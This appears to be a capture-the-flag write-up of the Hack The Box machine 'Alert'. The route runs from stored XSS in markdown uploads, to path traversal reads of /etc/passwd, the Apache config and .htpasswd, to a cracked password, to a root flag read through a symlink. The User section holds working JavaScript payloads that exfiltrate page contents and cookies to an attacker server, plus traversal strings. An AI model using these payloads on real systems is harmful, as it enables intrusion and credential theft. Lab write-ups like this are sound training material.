---
title: alert
date: 2024-12-29
draft: false
tags:
  - htb
  - easy
  - linux
category: Write-up
description: Alert is an easy Linux box where an XSS on a markdown site leads to an internal Arbitrary File Read, exposing a password hash that gets cracked for SSH access; local process enumeration then reveals a scheduled PHP script writable by the management group, making root execution almost embarrassingly convenient.
---

# Initial Recon

We found two forbidden directories along with a few accessible files. Real subtle security design there.

``` 
→ /uploads
→ /messages 
→ messages.php
→ contact
```

So, we landed on a home webpage where we could upload `.md` files.

## Burp Suite

We confirmed the target was vulnerable.

![[/images/alertscr.png]]

→ We figured out the uploaded file gets stored in the `database`, and we could **share it using a generated link** provided for viewing.

![[/images/alert1.png]]

→ Then we moved to the contact page, where we were able to send a message directly to the admin.

---

> Note: For the XSS attack to work, someone actually needs to click the link. Humanity’s greatest vulnerability strikes again.

---

→ We hosted an HTTP server on our machine and sent the admin a message containing:

``` 
http://<our-ip>:<port>/<somefile>
```

To verify whether the admin clicked the link — he did. The file was downloaded directly from our machine.

---

> **Key Points :**
> 1. The webpage is vulnerable to XSS and stores uploaded files as shareable links.
> 2. The admin clicks links sent through the contact page.

---

# User

So now the goal was simple — get the script executed by the admin and retrieve the data from `index.php?page=messages` along with the admin cookie.

> **`Payload plays a crucial role here`**

We uploaded a payload, used the generated link, and sent it to the admin. Once clicked, the script executed under the admin context.

Place the payload inside the `Script Tags`.

```javascript
var readfile="http://alert.htb/index.php?page=messages";
	fetch(readfile)
		.then(response => response.text())
		.then(data => {     
		    fetch("http://10.10.14.39:9001/?data=" + encodeURIComponent(data) + "&cookie=" + document.cookie);
		})
		.catch(error => fetch("http://10.10.14.39:9001/?err=" + error.message));

```

⇒ Output on our Python server running on port `9001`:

``` 
GET / data=%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20href%3D%22css%2Fstyle.css%22%3E%0A%20%20%20%20%3Ctitle%3EAlert%20-%20Markdown%20Viewer%3C%2Ftitle%3E%0A%3C%2Fhead%3E%0A%3Cbody%3E%0A%20%20%20%20%3Cnav%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22index.php%3Fpage%3Dalert%22%3EMarkdown%20Viewer%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22index.php%3Fpage%3Dcontact%22%3EContact%20Us%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22index.php%3Fpage%3Dabout%22%3EAbout%20Us%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22index.php%3Fpage%3Ddonate%22%3EDonate%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22index.php%3Fpage%3Dmessages%22%3EMessages%3C%2Fa%3E%20%20%20%20%3C%2Fnav%3E%0A%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%0A%20%20%20%20%20%20%20%20%3Ch1%3EMessages%3C%2Fh1%3E%3Cul%3E%3Cli%3E%3Ca%20href%3D%27messages.php%3Ffile%3D2024-03-10_15-48-34.txt%27%3E2024-03-10_15-48-34.txt%3C%2Fa%3E%3C%2Fli%3E%3C%2Ful%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3Cfooter%3E%0A%20%20%20%20%20%20%20%20%3Cp%20style%3D%22color%3A%20black%3B%22%3E%C2%A9%202024%20Alert.%20All%20rights%20reserved.%3C%2Fp%3E%0A%20%20%20%20%3C%2Ffooter%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%0A&cookie= HTTP/1.1" 200 -

```

→ After decoding it:

``` 
:
<div class="container">
        <h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
    </div>
:
```

→ We used the parameter `messages.php?file=2024-03-10_15-48-34.txt` to access system files. Turns out the endpoint happily reads arbitrary files like it’s doing us a favor.

`Modified payload` to retrieve system files through the vulnerable parameter:

```javascript
var readfile="http://alert.htb/messages.php?file=../../../../etc/passwd";
  fetch(readfile)
    .then(response => response.text())
    .then(data => {     
      fetch("http://10.10.14.39:9001/?data=" + encodeURIComponent(data) + "&cookie=" + document.cookie);
    })
    .catch(error => fetch("http://10.10.14.39:9001/?err=" + error.message));
```

The process of generating the link and sending it to the admin became repetitive after this point.

→ Once decoded, we found the following users:

``` output
- admin
- albert
- david 
```

→ From here, we reused the same payload, changing only the target path each time, like:

``` 
../../../../etc/hosts
```

⇒ We discovered another domain:

``` 
statistics.alert.htb
```

Then we changed the path again:

``` 
../../../../etc/apache2/sites-available/000-default.conf
```

⇒ This allowed us to inspect the `Apache configuration`.

⇒ The path to the stored `authenticated user credentials` was mentioned there.

![[/images/alert2.png]]

⇒ `/var/www/statistics.alert.htb/.htpasswd`

⇒ We obtained credentials.

> `albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/` → `manchesterunited`

Logged in as `albert`.

# Root

``` 
ps aux    
```

→ We noticed a process running:

``` 
/usr/bin/php -/opt/website-monitor
```

→ It was hosted on:

``` 
127.0.0.1:8080
```

→ After checking it, we found a monitor folder with `read, write, and execute` permissions for all users. Beautifully reckless.

``` 
touch rootflag.txt
```

⇒ We created a simple text file.

``` 
ln -sf /root/root.txt rootflag.txt 
```

⇒ Since we knew where the real `root.txt` existed, we created a `symbolic link` forcing `rootflag.txt` to point toward the original file.

→ Now `rootflag.txt` contained the contents of `root.txt`. Since direct terminal access was denied, we used `curl` against the localhost service instead.

``` 
eg:
albert@alert:/opt/website-monitor/monitors$ cat rootflag.txt
cat: rootflag.txt: Permission denied

albert@alert:/opt/website-monitor/monitors$ curl http://127.0.0.1:8080/monitors/rootflag.txt
```

``` 
rootflag.txt - e9e1d744be37421134e24aa84b1fa4a7
```

Gained `root`.
